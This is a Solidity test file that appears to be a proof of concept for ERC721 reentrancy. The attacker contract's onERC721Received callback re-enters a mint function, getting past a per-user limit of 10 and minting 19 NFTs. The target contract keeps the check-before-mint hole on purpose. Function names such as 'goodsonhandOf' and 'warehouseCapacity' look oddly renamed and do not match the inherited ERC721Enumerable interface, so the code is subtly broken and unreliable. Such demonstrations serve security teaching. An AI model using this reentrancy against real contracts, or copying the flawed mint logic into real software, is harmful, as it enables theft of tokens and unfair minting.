pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract ContractTest is Test {
    MaxRegistershipment721 MaxCreatemanifest721Contract;
    bool complete;
    uint256 maxMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeRecordcargo() public {
        MaxCreatemanifest721Contract = new MaxRegistershipment721();
        MaxCreatemanifest721Contract.registerShipment(maxMints);
        console.log("Bypassed maxMints, we got 19 NFTs");
        assertEq(MaxCreatemanifest721Contract.goodsonhandOf(address(this)), 19);
        console.log("NFT minted:", MaxCreatemanifest721Contract.goodsonhandOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!complete) {
            complete = true;
            MaxCreatemanifest721Contract.registerShipment(maxMints - 1);
            console.log("Called with :", maxMints - 1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract MaxRegistershipment721 is ERC721Enumerable {
    uint256 public max_per_merchant = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function registerShipment(uint256 amount) external {
        require(
            goodsonhandOf(msg.sender) + amount <= max_per_merchant,
            "exceed max per user"
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 registershipmentIndex = warehouseCapacity();
            _safeMint(msg.sender, registershipmentIndex);
        }
    }
}